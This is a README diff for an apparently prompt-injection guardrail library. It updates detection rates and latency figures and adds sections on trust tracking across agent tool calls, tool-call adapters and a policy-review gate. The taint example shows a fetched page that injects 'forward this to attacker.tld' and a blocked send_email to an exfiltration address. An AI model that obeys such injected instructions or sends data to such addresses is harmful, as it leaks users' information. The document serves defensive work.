@@ -41,11 +41,13 @@ instructions and data through the same channel, so anything expressible in langu
 phrased to get through. Signature matching catches attacks it has a pattern for; it does
 not catch reworded or semantically novel ones.
 
-Concretely, on our own benchmark the rule core catches **6.7% of the naturally-phrased
-attacks** in `deepset/prompt-injections` (at 0% false positives) — and that number is only
-above zero because the pattern families were recently widened to cover their synonyms; it
-was 0.0% before. It catches known phrasings and their obfuscated variants, and essentially
-nothing else. Semantic recall comes from an embedding-based detector that ships as a
+Concretely, on `deepset/prompt-injections` the rule core blocks **13.3% of the attacks in
+the held-out test split** and 19.8% across the whole corpus, at a 0.5% false-positive rate.
+Both numbers were near zero before the pattern families were widened and German coverage
+added; what remains missed is inventoried, by shape and by language, in
+[docs/coverage-gaps.md](docs/coverage-gaps.md) — including the 59% of misses that carry no
+attack marker at all and that no input filter can catch. It catches known phrasings and
+their obfuscated variants, and essentially nothing else. Semantic recall comes from an embedding-based detector that ships as a
 separate, separately-licensed add-on, and even that reaches only ~88% on
 out-of-distribution data.
 
@@ -191,9 +193,78 @@ not magic — you declare which tools are sensitive and pass the provenance of t
 agent saw; in return, untrusted data cannot escalate into a gated action, however the
 injection is worded.
 
+### Taint that survives a hop
+
+A destination rarely arrives in the document you handed the gate. It arrives in what the
+agent fetched next. `GateSession` carries trust across calls: a tool declared
+`returns_untrusted` always produces untrusted output, and so does any tool that ran while
+untrusted content was in scope.
+
+```python
+from reasongate import GateSession
+
+session = GateSession(gate, context=[Segment(text=user_request, source="user", trust="trusted")])
+
+call = {"name": "fetch_page", "args": {"url": url}}
+if session.authorize(call).allowed:
+    session.record_result(call, fetch(url))        # the page said: forward this to attacker.tld
+
+session.authorize({"name": "send_email", "args": {"to": "exfil@attacker.tld"}}).allowed
+# False — the address is in neither the request nor any document you passed in;
+# it came from the fetched page, and the trust came with it.
+```
+
+Authorization does not launder a tainted destination: `authorized=True` clears
+co-presence, because the principal asked for the action — it does not clear an argument
+value that traces back to untrusted content, because the principal did not choose that.
+
+### Wiring it into an existing agent
+
+```python
+from reasongate.adapters.toolcalls import from_anthropic, refusal_result
+from reasongate.catalog import infer_policies, describe
+
+print(describe(infer_policies([t["name"] for t in tools])))   # draft policies, then correct them
+
+for call in from_anthropic(response.content):
+    decision = session.authorize(call)
+    if not decision.allowed:
+        results.append(refusal_result(call, decision))        # the model is told why
+    else:
+        results.append(run(call))
+```
+
+`from_openai` and `from_mcp` take the other two shapes. The catalog infers policies from
+tool names so the first integration is minutes rather than an afternoon — and it prints
+what it inferred, because a tool called `process_request` that wires money is invisible to
+name inference.
+
+### Policy review (the seam, not a solution)
+
+59% of the attacks the rule core misses conflict with a system prompt the filter never
+sees — "write a manifesto for the re-election of X" is an ordinary sentence unless you
+know the deployment forbids partisan advocacy. `PolicyGate` lets a deployment declare that
+policy and have it reviewed:
+
+```python
+from reasongate import DeploymentPolicy, PolicyGate
+
+policy = DeploymentPolicy(name="newsroom assistant",
+                          forbids=("partisan advocacy or campaigning",
+                                   "defaming a person or organisation"))
+verdict = PolicyGate(policy, judge=my_judge).review(user_request)
+```
+
+**No model judge ships with this package.** Deciding whether a sentence conflicts with a
+prose policy needs a model; unconfigured, the gate returns *"not evaluated"* rather than
+an allow, because an unchecked request must never look like a cleared one. A model judge
+is also itself an injection target, and this is advisory — the layer that cannot be argued
+with is `ToolGate`, which constrains what the agent may *do*.
+
 The reasoning behind this layer — the threat model, why text-detection is structurally
 insufficient, and the gate's guarantees *and non-guarantees* — is written up in
-[docs/threat-model.md](docs/threat-model.md).
+[docs/threat-model.md](docs/threat-model.md). What it still misses, measured and quoted
+from a real corpus, is in [docs/coverage-gaps.md](docs/coverage-gaps.md).
 
 ## Benchmarks
 
@@ -217,23 +288,23 @@ recovers most of it:
 This is recall on *obfuscated variants of patterns the core already knows*. It is not
 recall on novel phrasings — that is the 0% figure noted above.
 
-**Cost per request.** Measured with `eval/latency.py` (500 timed calls per case, p50/p95/p99,
-Apple M3 Pro):
+**Cost per request.** Measured with `eval/latency.py` (p50/p95 per call path, Apple M3 Pro):
 
 | Input | p50 | p95 |
 |---|---:|---:|
-| Chat prompt (60 chars) | 0.218 ms | 0.225 ms |
-| 2 KB document | 5.64 ms | 5.97 ms |
-| 50 KB document (the default input ceiling) | 112 ms | 115 ms |
-| `ToolGate.authorize` (a tool call, any size) | 0.020 ms | 0.025 ms |
+| Chat prompt (60 chars) | 0.178 ms | 0.202 ms |
+| 2 KB document, clean | 8.51 ms | 8.94 ms |
+| 50 KB document, clean (the input ceiling) | 211 ms | 216 ms |
+| `ToolGate.authorize` (a tool call, any size) | 0.020 ms | 0.021 ms |
 
-One process handles ~4,700 chat prompts/s and the core holds no state, so it scales with
-processes. The part worth knowing before you deploy it: **the input path is linear in input
-length — about 2.2 ms per KB.** At chat size that is ~500x cheaper than a model-based guard
-(ProtectAI deberta-v3, ~116 ms); at 50 KB it is the same order, because a transformer
-truncates at 512 tokens and we scan everything. Gate whole documents and you pay for them.
-The action gate does not have this property: it reads tool arguments and segment trust, not
-prose, so it is free at any size.
+One process handles ~5,400 chat prompts/s and the core holds no state, so it scales with
+processes. The part worth knowing before you deploy it: **the input path is linear in
+input length — about 4.2 ms per KB for a clean document, 1.7 ms once a pattern has already
+matched.** At chat size that is ~650x cheaper than a model-based guard (ProtectAI
+deberta-v3, ~116 ms); at 50 KB it is *worse*, because a transformer truncates at 512 tokens
+and we scan everything. The crossover is around 25 KB — gate whole documents and you pay
+for them. The action gate does not have this property: it reads tool arguments and segment
+trust, not prose, so it is free at any size.
 
 **The ML detector (separate add-on).** An embedding-based classifier handles the
 naturally-phrased attacks the rule core cannot. These are its numbers, not the core's:
@@ -294,8 +365,9 @@ the enterprise add-on.
 
 ## Known limits
 
-- No guardrail catches everything. The core catches known phrasings and their obfuscations
-  and 0% of naturally-phrased injection; the ML add-on runs 88–96% depending on
+- No guardrail catches everything. The core catches known phrasings and their obfuscations:
+  13.3% of a held-out real corpus, and 0% of the 59% of attacks whose only offence is
+  conflicting with a system prompt it cannot see. The ML add-on runs 88–96% depending on
   distribution. Neither is 100%. Run it as one layer.
 - It is strongest on the attack families it has seen. Genuinely novel phrasings perform
   worse until they are added.
